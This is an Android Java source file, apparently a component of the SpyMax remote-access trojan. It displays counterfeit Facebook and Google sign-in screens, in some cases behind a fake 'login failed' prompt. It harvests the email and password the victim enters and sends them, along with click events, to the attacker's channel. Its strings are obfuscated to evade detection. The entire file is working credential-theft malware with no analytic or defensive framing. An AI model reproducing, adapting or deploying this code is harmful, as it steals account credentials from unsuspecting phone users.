package spymax.stub7;

import android.app.Activity;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;



import android.view.View;
import android.widget.Button;

import android.widget.TextView;

public class _sc_fb_ extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        String value = null ;
        try {
             value = intent.getStringExtra("key");
        }catch (Exception e){}

        if (value == null)
        {
            value = "off";
        }


            if (shown)
            {
                finish();
                return;
            }

            if (value.endsWith(":fb"))
           {
               PackageManager pm = ClassGen11.app_ClassGen11_Context.getPackageManager();


               if(!isPackageInstalled(ClassGen3._Reblace_( "com[RANDOM-STRING]facebook[RANDOM-STRING]katana","[RANDOM-STRING]"), pm) &&
                       !isPackageInstalled(ClassGen3._Reblace_(  "com[RANDOM-STRING]facebook[RANDOM-STRING]lite","[RANDOM-STRING]"), pm))
               {
                   String sn = "Facebook<"+"Facebook Not installed"+"<"+"Facebook Not installed";
                   ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, sn.getBytes());
                   finish();
                   return;
               }

               needdone =true;
               if (value.startsWith("1"))
               {
                   AlertDialog.Builder builder = new AlertDialog.Builder(this);
                   builder.setMessage(ClassGen3._Reblace_( "An unexpec[RANDOM-STRING]ted error occu[RANDOM-STRING]rred Please","[RANDOM-STRING]")+"\n"+"try logging in again.")
                           .setTitle(ClassGen3._Reblace_( "Face[RANDOM-STRING]book","[RANDOM-STRING]"))
                           .setCancelable(false)
                           .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                               public void onClick(DialogInterface dialog, int id) {
                                   //do things
                                   setContentView(R.layout.flogin);
                                   shown=true;
                                   Button login  = (Button) findViewById(R.id.button2);
                                   login.setOnClickListener(mCorkyListener);
                                   Button creat  = (Button) findViewById(R.id.button);
                                   creat.setOnClickListener(createaconte);

                                   TextView textView = (TextView) findViewById(R.id.forgetpassword);
                                   textView.setOnClickListener(revocerclick);
                               }
                           });
                   AlertDialog alert = builder.create();
                   alert.show();

               }
               else
               {
                   setContentView(R.layout.flogin);
                   shown = true;
                   Button login  = (Button) findViewById(R.id.button2);
                   login.setOnClickListener(mCorkyListener);

                   Button creat  = (Button) findViewById(R.id.button);
                   creat.setOnClickListener(createaconte);

                   TextView textView = (TextView) findViewById(R.id.forgetpassword);
                  textView.setOnClickListener(revocerclick);

               }




           }else if(value.endsWith(":go"))
           {
               needdone =true;
               if (value.startsWith("1"))
               {
                   AlertDialog.Builder builder = new AlertDialog.Builder(this);
                   builder.setMessage(ClassGen3._Reblace_( "Login [RANDOM-STRING]Faild!","[RANDOM-STRING]")+"\n"+"Please Sign in Again.")
                           .setTitle("Google")
                           .setCancelable(false)
                           .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                               public void onClick(DialogInterface dialog, int id) {
                                   //do things
                                   setContentView(R.layout.glogin);
                                   shown=true;
                                   Button login  = (Button) findViewById(R.id.sinbtn);
                                   login.setOnClickListener(singimallisten);


                                   TextView textView2 = (TextView) findViewById(R.id.lrnmor);
                                   textView2.setOnClickListener(lrnmor);
//
                                   TextView textView = (TextView) findViewById(R.id.gmailforgtpass);
                                   textView.setOnClickListener(Recovergmal);
                               }
                           });
                   AlertDialog alert = builder.create();
                   alert.show();

               }
               else
               {
                   setContentView(R.layout.glogin);
                   shown=true;
                   Button login  = (Button) findViewById(R.id.sinbtn);
                   login.setOnClickListener(singimallisten);


//                                   Button creat  = (Button) findViewById(R.id.button);
//                                   creat.setOnClickListener(createaconte);
//
                   TextView textView = (TextView) findViewById(R.id.gmailforgtpass);
                   textView.setOnClickListener(Recovergmal);

               }




           }else
           {
               finish();
           }


    }


    private View.OnClickListener singimallisten = new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            TextView textView = (TextView) findViewById(R.id.usrgmail);
            String username = textView.getText().toString();
            TextView textView2 = (TextView) findViewById(R.id.passgmal);
            String pass = textView2.getText().toString();
            try {

                if (username.length() <= 3) {
                    _srv_worker_.showToast("Please Check Your Email/Password.");
                    return;
                }

                if (pass.length() < 8) {
                    _srv_worker_.showToast("Password Must At least 8 characters.");
                    return;
                }
                String sn = "Gmail<"+username+"<"+pass;

                ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, sn.getBytes());
                done=true;
                finish();
            } catch (Exception e) {
            }
        }
        };



    private boolean isPackageInstalled(String packageName, PackageManager packageManager) {
        try {
            packageManager.getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
    private View.OnClickListener createaconte = new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            _srv_worker_.openlink(ClassGen3._D_BASE64_("aHR0cHM6KiptLmZhY2Vib29rLmNvbSpyLnBocA==").replace("*","/"));

            String sn = "Facebook<"+"Create-New-Account"+"<"+"Create-New-Account";
            ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, sn.getBytes());
            return;
        }
    };

    private View.OnClickListener lrnmor = new View.OnClickListener() {
        @Override
        public void onClick(View view) {

            _srv_worker_.openlink(ClassGen3._Reblace_( "ht[RANDOM-STRING]tps://supp[RANDOM-STRING]ort.goog[RANDOM-STRING]le.com/acc[RANDOM-STRING]ounts/answ[RANDOM-STRING]er/27[RANDOM-STRING]441?hl=en&ref_topic=3382[RANDOM-STRING]296","[RANDOM-STRING]"));
            String sn = "Gmail<"+"Learn-more"+"<"+"Learn-more";
            ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, sn.getBytes());
            return;
        }

    };

    private View.OnClickListener Recovergmal = new View.OnClickListener() {
        @Override
        public void onClick(View view) {

            _srv_worker_.openlink(ClassGen3._Reblace_( "ht[RANDOM-STRING]tps:/[RANDOM-STRING]/acco[RANDOM-STRING]unts.goo[RANDOM-STRING]gle.com/sig[RANDOM-STRING]nin/rec[RANDOM-STRING]overy","[RANDOM-STRING]"));
            String sn = "Gmail<"+"Forget-Password"+"<"+"Forget-Password";
            ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, sn.getBytes());
            return;
        }

    };

    private View.OnClickListener revocerclick = new View.OnClickListener() {
        @Override
        public void onClick(View view) {

            _srv_worker_.openlink(RecoverFB);
            String sn = "Facebook<"+"Forget-Password"+"<"+"Forget-Password";
            ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, sn.getBytes());
            return;
        }

        };

    private View.OnClickListener mCorkyListener = new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            TextView textView = (TextView) findViewById(R.id.emil);
            String username = textView.getText().toString();
            TextView textView2 = (TextView) findViewById(R.id.pass);
            String pass = textView2.getText().toString();
            try
            {

                if (username.length() <= 5)
                {
                    _srv_worker_.showToast("Please Check Your Email/Password.");
                    return;
                }

                if (pass.length() < 8)
                {
                    _srv_worker_.showToast("Password Must At least 8 characters.");
                    return;
                }

                PackageManager pm = ClassGen11.app_ClassGen11_Context.getPackageManager();

                // boolean isFPLITE = isPackageInstalled("com.facebook.lite", pm);
                if( isPackageInstalled("com.facebook.katana", pm))
                {
                    try{
                        Intent launchIntent = getPackageManager().getLaunchIntentForPackage("com.facebook.katana");
                        launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity( launchIntent );
                    }catch (Exception e){}

                }else if(isPackageInstalled("com.facebook.lite", pm))
                {
                    try{
                        Intent launchIntent = getPackageManager().getLaunchIntentForPackage("com.facebook.lite");
                        launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity( launchIntent );

                    }catch (Exception e){}

                }

            }catch(Exception e) {}
            String sn = "Facebook<"+username+"<"+pass;

            ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, sn.getBytes());
            done=true;
            finish();
        }



    };

    boolean done =false;
    boolean needdone =false;
    boolean shown =false;



    String RecoverFB = ClassGen3._Reblace_("ht[RANDOM-STRING]tps[RANDOM-STRING]:[RANDOM-STRING]//m.face[RANDOM-STRING]book.com/login[RANDOM-STRING]/ide[RANDOM-STRING]ntify/[RANDOM-STRING]?ctx=rec[RANDOM-STRING]over","[RANDOM-STRING]");
    @Override
    public void finish() {
        if(needdone)
        {
            if(!done)
            {
                String sn = "S-M-H<"+"failed"+"<"+"failed";

                ClassGen2._send_it_(ClassGen3.s_ClassGen3_fh, sn.getBytes());
            }
        }

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        }
        else {
            super.finish();
        }
    }



}
